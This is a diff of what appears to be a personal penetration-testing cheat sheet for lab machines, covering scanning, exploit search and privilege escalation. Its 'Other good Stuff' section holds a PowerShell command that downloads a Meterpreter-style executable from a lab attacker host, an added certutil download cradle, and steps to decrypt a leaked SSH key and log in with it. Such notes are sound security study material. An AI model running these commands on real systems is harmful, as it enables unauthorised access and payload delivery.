@@ -1,4 +1,6 @@
-1. Information Gathering
+=====================================================================
+		1. Information Gathering
+=====================================================================
 
 a. Scan for all IP addresses in the given network == Using Sudo, scan for IP Address alive in the network. You can either use your current IP Address or input an IP Address to scan.
 	i.) sudo arp-scan $IP_Address
@@ -22,7 +24,9 @@ b. Perform Network Mapping
 		sudo nmap -sCV -Pn -vv $IP_Address
 
 =====================================================================
-2. Vulnerability Analysis:
+		2. Vulnerability Analysis:
+=====================================================================
+
 a. Access each HTTP service manually by going to the browser and typing each IP in the URL.
 	i.) Record down each of the details manually for now.
 	
@@ -59,9 +63,10 @@ e. Search for Exploits
 		ii.) searchsploit
 			searchsploit ms17-010
 			
-
 =====================================================================
-3.) Network Exploitations
+		3.) Network Exploitations
+=====================================================================
+
 
 a. Network Exploitation
 	i.) Domain Enumeration
@@ -416,7 +421,8 @@ a. Network Exploitation
 		
 			
 =====================================================================
-4.) Web Application Exploitation
+		4.) Web Application Exploitation
+=====================================================================
 
 	1. Information Gathering
 		a. Identify Technologies and Frameworks
@@ -580,7 +586,10 @@ a. Network Exploitation
 			5.) you will be able to get a hash value of connection. You can crack the password using rockyou.
 
 =====================================================================
-5.) Other good Stuff
+			5.) Other good Stuff
+=====================================================================
+
+
 a. Running .exe files on Linux
 - use Wine
 eg command: wine UserInfo.exe -v find -first "administrator"
@@ -607,13 +616,21 @@ e.) Test HTTP Method to upload files:
 davtest -url http://$IP_ADDRESS
 curl -X OPTIONS -I http://$IP_ADDRESS
 
-
 f.) Some other Powershell commands:
 Download a file:
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.31:8000/metershell3.exe', 'metershell3.exe')"
+certutil -urlcache -f URL-link/file.txt file.txt
+
+g.) RSA Key - encrypted where hype_key is the key name
+cat hype_key | xxd -r -p
+cat hype_key | xxd -r -p >> hype_key_encrypted
+openssl rsa -in hype_key_encrypted -out hype_key_decrypted
+ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i hype_key_decrypted hype@$IP
 
 =====================================================================
-6.) Priv Escalation
+		6.) Priv Escalation
+=====================================================================
+
 
 1.) Windows 
 	a.)Grant yourself permission in windows:
